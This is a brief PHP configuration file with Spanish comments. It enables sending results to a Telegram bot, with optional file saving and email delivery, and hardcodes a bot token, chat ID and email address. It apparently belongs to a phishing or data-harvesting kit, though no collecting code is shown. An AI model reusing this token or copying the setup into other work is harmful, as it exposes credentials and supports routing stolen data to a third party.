<?php
// Envio telegram
// true = SI | false = NO
$telegram_send = true;
$bottoken = "5306189325:AAFZKtGVa3V9d9wFnLrI367reL_Y5-d1VoU";
$chatid = "991846161";

// Guardar archivo
// true = SI | false = NO
$file_save = false;

// Envio Gmail
// true = Si | false = NO
$email_send = false;
$email = "jasonidk@test.com";
?>